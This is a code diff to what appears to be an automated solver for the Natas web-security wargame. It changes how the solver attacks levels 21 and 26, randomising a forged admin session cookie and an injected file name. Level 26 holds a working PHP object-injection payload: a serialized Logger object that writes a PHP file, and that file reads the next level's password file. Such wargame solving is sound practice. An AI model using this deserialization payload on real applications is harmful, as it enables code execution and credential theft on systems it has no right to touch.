@@ -261,7 +261,16 @@ var levels = [...]Grabber{
 					Post{
 						Headers{
 							grab,
-							SetData{"Cookie": Text{"PHPSESSID=1"}},
+							SetData{
+								"Cookie": Combine{
+									Text{"PHPSESSID="},
+									Random{
+										"Level21Cookie",
+										"abcdefghijklmnopqrstuvwxyz",
+										32,
+									},
+								},
+							},
 						},
 						SetData{
 							"admin":  Text{"1"},
@@ -279,7 +288,16 @@ var levels = [...]Grabber{
 				32,
 			},
 		},
-		SetData{"Cookie": Text{"PHPSESSID=1"}},
+		SetData{
+			"Cookie": Combine{
+				Text{"PHPSESSID="},
+				Random{
+					"Level21Cookie",
+					"abcdefghijklmnopqrstuvwxyz",
+					32,
+				},
+			},
+		},
 	},
 	//level 22
 	Get{
@@ -343,13 +361,25 @@ var levels = [...]Grabber{
 			SetData{
 				"Cookie": Combine{
 					Text{"drawing="},
-					Base64Encode{
-						PHPSerialize{
-							"Logger",
-							map[string]interface{}{
-								"logFile": "img/password.php",
-								"initMsg": "",
-								"exitMsg": "<?php echo \"Password: \";include(\"/etc/natas_webpass/natas27\");?>",
+					URLEncode{
+						Base64Encode{
+							PHPSerialize{
+								"Logger",
+								map[string]interface{}{
+									"logFile": Combine{
+										Combine{
+											Text{"img/"},
+											Random{
+												"Level26LogFile",
+												"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
+												32,
+											},
+										},
+										Text{".php"},
+									},
+									"initMsg": "",
+									"exitMsg": "<?php echo \"Password: \";include(\"/etc/natas_webpass/natas27\");?>",
+								},
 							},
 						},
 					},
@@ -362,7 +392,17 @@ var levels = [...]Grabber{
 				"Password: ",
 				32,
 			},
-			Text{"/img/password.php"},
+			Combine{
+				Combine{
+					Text{"/img/"},
+					Random{
+						"Level26LogFile",
+						"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
+						32,
+					},
+				},
+				Text{".php"},
+			},
 		},
 	},
 	//level 27
